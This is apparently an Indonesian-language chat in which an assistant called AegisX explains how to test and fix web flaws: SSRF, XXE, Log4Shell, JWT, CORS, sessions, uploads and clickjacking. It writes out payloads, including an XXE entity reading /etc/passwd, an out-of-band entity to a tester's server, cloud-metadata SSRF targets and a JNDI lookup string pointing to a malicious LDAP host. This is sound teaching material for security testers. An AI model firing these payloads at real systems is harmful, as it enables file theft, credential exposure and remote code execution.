User: Apa isi OWASP A10 tentang server-side request forgery?
AegisX: A10 dalam OWASP Top 10 2021 adalah Server-Side Request Forgery atau SSRF. Ini terjadi saat aplikasi mengambil URL yang dikendalikan penyerang dan server membuat permintaan ke URL tersebut atas nama aplikasi. Dampaknya besar karena server sering punya akses ke jaringan internal, metadata cloud, dan layanan yang tidak bisa dijangkau dari internet. Contoh fitur yang rentan: impor gambar dari URL, generator pratinjau link, webhook, dan integrasi PDF. Karena server mempercayai permintaan dari dirinya sendiri, SSRF bisa melewati firewall dan mencapai layanan internal yang seharusnya terlindungi.

User: Bagaimana cara menguji SSRF secara bertanggung jawab?
AegisX: Cari semua fitur yang menerima URL: impor, sinkronisasi, webhook, dan pratinjau. Uji dengan URL internal seperti http://127.0.0.1, http://localhost, http://0.0.0.0, dan http://169.254.169.254 yang merupakan metadata cloud. Gunakan teknik bypass untuk filter: http://2130706433 sebagai bentuk desimal 127.0.0.1, http://[::1] untuk localhost IPv6, pengalihan lewat layanan publik, dan penyandian URL ganda. Amati perbedaan waktu respons, isi respons, dan error. Untuk deteksi out-of-band saat respons tidak terlihat, gunakan layanan kolaborator yang mencatat permintaan masuk. Jika menemukan SSRF, dokumentasikan layanan internal mana yang bisa dijangkau dan dampaknya, tetapi jangan membaca data internal secara berlebihan karena itu di luar kebutuhan bukti.

User: Bagaimana cara mencegah SSRF di aplikasi?
AegisX: Pertahanan berlapis. Validasi URL dengan daftar putih domain yang diizinkan, bukan daftar hitam, dan jangan hanya memeriksa string awal URL karena bisa dilewati. Resolusi DNS ganda: cek alamat IP hasil resolusi, dan pastikan bukan alamat privat, loopback, atau link-local. Jangan mengikuti pengalihan secara membabi buta; validasi ulang setiap hop. Untuk metadata cloud, blokir akses ke 169.254.169.254 di jaringan. Pisahkan layanan yang membuat permintaan eksternal dari jaringan internal dengan segmentasi dan egress proxy yang mewajibkan daftar putih. Batasi protokol: hanya izinkan HTTP dan HTTPS, bukan ftp, gopher, atau file. Konfigurasikan klien HTTP dengan timeout pendek dan tanpa kemampuan membaca file lokal.

User: Apa itu XXE dan bagaimana cara mengujinya?
AegisX: XXE atau XML External Entity adalah kerentanan saat parser XML memproses entity eksternal yang didefinisikan penyerang. Dokumen XML bisa mendeklarasikan entity yang memuat file lokal, misalnya <!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>, lalu nilainya muncul di respons. Untuk menguji, cari semua fitur yang menerima XML: upload dokumen, impor konfigurasi, API SOAP, dan format Office. Kirim dokumen XML dengan entity eksternal sederhana dan amati apakah isi file muncul. Jika tidak ada respons langsung, gunakan entity eksternal out-of-band yang memuat konten ke server yang kamu kendalikan. Perbaikan: nonaktifkan pemrosesan entity eksternal dan DTD di parser XML, atau lebih baik, jangan memakai XML sama sekali dan gunakan format yang lebih aman seperti JSON dengan parser yang ketat.

User: Bagaimana cara menguji XML parser di aplikasi?
AegisX: Mulai dengan mengidentifikasi input yang diproses sebagai XML. Kirim dokumen XML dasar untuk memastikan parser aktif, lalu uji entity internal: <!DOCTYPE foo [<!ENTITY x "nilai">]>. Lanjutkan dengan entity eksternal file: <!ENTITY xxe SYSTEM "file:///etc/hostname">, lalu entity eksternal URL: <!ENTITY xxe SYSTEM "http://server-kamu/x">. Uji juga parameter entity untuk blind XXE dan entity ekspansi untuk serangan billion laughs yang menghabiskan memori. Untuk setiap pengujian, amati tiga saluran: respons langsung, pesan error yang membocorkan isi file, dan permintaan out-of-band. Selalu uji di lingkungan yang kamu kuasai dan berhenti saat bukti sudah cukup. Laporan XXE harus menyertakan payload yang dipakai dan dampak yang terbukti.

User: Apa itu log4shell dan mengapa sangat berbahaya?
AegisX: Log4Shell atau CVE-2021-44228 adalah kerentanan pada pustaka logging Java Log4j yang memungkinkan eksekusi kode jarak jauh. Log4j mendukung fitur lookups yang memproses string seperti ${jndi:ldap://server-jahat/a} saat mencatat log. Jika aplikasi mencatat input pengguna, misalnya user-agent atau nama pengguna, penyerang bisa menyuntikkan string itu dan memaksa server menghubungi server LDAP jahat yang mengirim kode berbahaya. Bahayanya karena Log4j dipakai di mana-mana, dari server web sampai perangkat jaringan, dan eksploitasinya sangat mudah. Perbaikannya adalah memperbarui Log4j ke versi 2.17 atau lebih baru, atau menghapus fungsi lookup jika tidak dipakai. Kerentanan ini mengajarkan pentingnya inventaris komponen dan kecepatan patch.

User: Bagaimana cara menguji serangan pada JWT secara mendalam?
AegisX: Uji JWT dari beberapa sudut. Pertama, algoritma: ubah header alg menjadi none dan hapus signature; jika diterima, verifikasi tidak dijalankan. Kedua, ubah RS256 menjadi HS256 dan pakai kunci publik server sebagai rahasia HMAC; jika server memakai kunci yang sama untuk verifikasi, kamu bisa memalsukan token. Ketiga, manipulasi klaim: ubah sub, role, atau admin menjadi true tanpa signature yang valid. Keempat, periksa klaim exp dan nbf: apakah token kedaluwarsa masih diterima. Kelima, periksa penyimpanan dan pengiriman: apakah token ada di URL atau localStorage yang rentan terhadap XSS. Perbaikan: gunakan algoritma yang aman secara eksplisit tanpa menerima none, pisahkan kunci untuk tanda tangan dan enkripsi, validasi issuer dan audience, dan simpan token di cookie httpOnly yang aman.

User: Bagaimana cara menguji CORS secara praktis?
AegisX: CORS adalah kebijakan browser yang diatur server lewat header Access-Control-Allow-Origin. Untuk menguji, kirim permintaan dengan header Origin yang berbeda: origin tepercaya, origin jahat, dan nilai null. Amati apakah server mencerminkan Origin yang dikirim, apakah mengembalikan tanda bintang, dan apakah header Access-Control-Allow-Credentials ikut aktif. Kombinasi berbahaya: Access-Control-Allow-Origin mencerminkan origin penyerang bersama Access-Control-Allow-Credentials: true, karena browser akan mengizinkan skrip jahat membaca respons. Uji juga dengan Origin: null yang bisa dipicu dari iframe sandbox. Untuk memperbaiki: jangan pernah mencerminkan origin sembarangan, gunakan daftar putih origin tepercaya, dan jangan gabungkan tanda bintang dengan kredensial.

User: Bagaimana cara menguji serangan pada sesi pengguna?
AegisX: Uji seluruh siklus hidup sesi. Saat login, periksa apakah session ID berubah dari sebelum login menjadi sesi terautentikasi; jika tetap sama, ada risiko session fixation. Periksa apakah session ID bisa ditebak dengan menganalisis polanya. Uji apakah cookie sesi punya atribut HttpOnly, Secure, dan SameSite yang benar, dan apakah domain serta path-nya terlalu luas. Uji logout: apakah sesi benar-benar dihancurkan di server atau hanya dihapus di klien, karena sesi yang tersisa bisa dipakai lagi. Uji idle timeout dan absolute timeout: apakah sesi tetap aktif setelah lama tidak dipakai. Periksa juga apakah aplikasi memakai sesi paralel dengan aman dan apakah token di URL bocor lewat referrer. Perbaikan: rotasi ID sesi setelah login, set atribut cookie yang ketat, hancurkan sesi di server saat logout, dan terapkan timeout yang wajar.

User: Bagaimana cara menguji keamanan upload file?
AegisX: Upload file adalah sumber banyak kerentanan. Uji tipe file: kirim file dengan ekstensi .php, .jsp, dan .svg yang bisa memuat skrip. Periksa apakah validasi berdasarkan ekstensi, MIME type dari header, atau isi file, dan apakah bisa dilewati dengan ekstensi ganda seperti .php.jpg atau karakter null. Uji apakah file disimpan di direktori yang bisa dieksekusi, dan akses langsung file yang di-upload untuk melihat apakah skrip berjalan. Uji path traversal pada nama file untuk menulis di luar direktori yang dimaksud. Periksa apakah file gambar benar-benar divalidasi isinya, bukan hanya namanya. Perbaikan: simpan file di luar webroot atau dengan nama acak tanpa ekstensi berbahaya, validasi isi dengan pustaka yang tepat, batasi ukuran, dan layani file dengan header Content-Disposition yang benar dan tipe konten daftar putih.

User: Bagaimana cara menguji serangan clickjacking?
AegisX: Clickjacking memanfaatkan iframe transparan untuk menipu pengguna mengklik elemen yang tidak mereka sadari. Untuk menguji, coba muat halaman target di dalam iframe di halaman lokal: <iframe src="https://target.com/halaman-penting"></iframe>. Jika halaman muncul, berarti tidak ada perlindungan clickjacking. Serangan klasik menimpa tombol tidak terlihat di atas tombol yang terlihat, sehingga pengguna tanpa sadar mengirim permintaan berbahaya. Perbaikan: kirim header X-Frame-Options: DENY atau SAMEORIGIN, dan gunakan Content-Security-Policy dengan frame-ancestors untuk kontrol yang lebih modern. Halaman yang memproses aksi sensitif seperti transfer dana dan perubahan pengaturan sebaiknya tidak bisa dimuat dalam frame sama sekali.

User: Bagaimana cara menguji header keamanan HTTP yang hilang?
AegisX: Periksa header respons dengan curl -I atau lewat proxy dan bandingkan dengan praktik terbaik. Content-Security-Policy membatasi sumber skrip dan meredam XSS. X-Frame-Options atau CSP frame-ancestors mencegah clickjacking. Strict-Transport-Security memaksa browser memakai HTTPS dan mencegah serangan downgrade. X-Content-Type-Options: nosniff mencegah browser menebak tipe konten. Referrer-Policy membatasi informasi yang bocor lewat header referrer. Permissions-Policy membatasi fitur browser seperti kamera dan mikrofon. Setiap header yang hilang bukan kerentanan berdiri sendiri, tetapi mengurangi kedalaman pertahanan. Laporkan sebagai temuan tingkat rendah hingga sedang dengan rekomendasi nilai header yang tepat untuk aplikasi tersebut.
